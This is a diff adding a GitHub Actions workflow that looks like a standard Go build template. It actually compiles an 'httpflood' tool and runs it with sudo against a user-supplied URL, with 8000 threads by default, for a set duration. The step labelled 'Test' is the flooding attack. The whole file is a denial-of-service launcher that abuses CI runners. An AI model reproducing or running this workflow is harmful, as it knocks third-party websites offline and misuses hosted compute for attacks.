@@ -1,0 +1,45 @@
+# This workflow will build a golang project
+# For more information see: https://docs.github.com/en/actions/automating-builds-and-tests/building-and-testing-go
+
+name: Go
+
+on:
+  workflow_dispatch:
+    inputs:
+      urltgt:
+        description: "URL Target"
+        required: true
+      Method:
+        description: "Method (Get / Post)"
+        required: true
+        default: "get"
+      thread:
+        description: "Threads"
+        required: true
+        default: "8000"
+      duration:
+        description: "Duration (In Seconds)"
+        required: true
+        default: "60"
+      headerFile:
+        description: "Header File txt (Make sure the file is exists)"
+        required: true
+        default: "nil"
+
+jobs:
+
+  build:
+    runs-on: ubuntu-latest
+    steps:
+    - uses: actions/checkout@v3
+
+    - name: Set up Go
+      uses: actions/setup-go@v4
+      with:
+        go-version: '1.20'
+
+    - name: Build
+      run: go build httpflood.go
+
+    - name: Test
+      run: sudo ./httpflood ${{ github.event.inputs.urltgt }} ${{ github.event.inputs.thread }} ${{ github.event.inputs.Method }} ${{ github.event.inputs.duration }} ${{ github.event.inputs.headerFile }}
